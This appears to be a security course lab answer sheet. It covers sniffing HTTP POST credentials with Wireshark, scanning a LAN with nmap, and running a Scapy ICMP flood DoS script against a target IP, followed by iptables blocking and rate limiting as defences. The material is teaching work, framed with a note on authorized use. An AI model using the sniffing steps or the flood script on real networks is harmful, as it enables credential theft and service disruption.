# MSEI 021

## Question 1: Implement the network sniffers to find out usernames and passwords by retrieving the packets from HTTP POST on any website.
Steps Using Wireshark (No Code Needed):

Open Wireshark.
Select your network interface.
Apply the filter: http.request.method == "POST".
Capture traffic, identify HTTP POST packets, and inspect their payload for credentials.

Note: HTTP POST often transmits data like usernames and passwords in plain text. Ensure ethical and authorized use.

## Question 2: Define the topology used in LAN and scan the network with details like IP, MAC Address, Host name, Username, and OS details of at least 10 machines, and generate the report.
Using nmap Command (No Code Needed):

Install nmap:
``` sudo apt install nmap ```

Scan your LAN:
``` sudo nmap -sn 192.168.1.0/24 ```
(Replace 192.168.1.0/24 with your subnet.)

To get detailed information, use:

sudo nmap -A -T4 192.168.1.0/24
(This will provide details like IP, MAC Address, Hostname, OS, and open ports.)

Save the output:

sudo nmap -A -T4 192.168.1.0/24 > network_report.txt
(The results will be stored in network_report.txt.)

## Question 3: Attempt a DoS/DDoS attack on the target computer and display the list of IPs with access details. Prevent the DDoS attack using any firewall.

Part A: Attempt DoS Attack
Code for DoS Attack Using Scapy:

python

from scapy.all import *

target_ip = "192.168.1.100"  # Replace with the target IP
packet = IP(dst=target_ip)/ICMP()  # ICMP packets for ping flood

print("Starting DoS attack...")
send(packet, count=10000, inter=0.001)  # Sends 10,000 packets
print("DoS attack completed.")

Part B: Display IPs Who Attempted the Attack
Monitor logs using:

bash
sudo tail -f /var/log/syslog

Use iptables to track incoming traffic:

bash
sudo iptables -L -n -v

Part C: Prevent DDoS Using Firewall
Commands to Block IPs Using iptables:

Block specific attacking IP:

bash
sudo iptables -A INPUT -s <attacker-ip> -j DROP

Use rate limiting to mitigate attacks:

bash
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
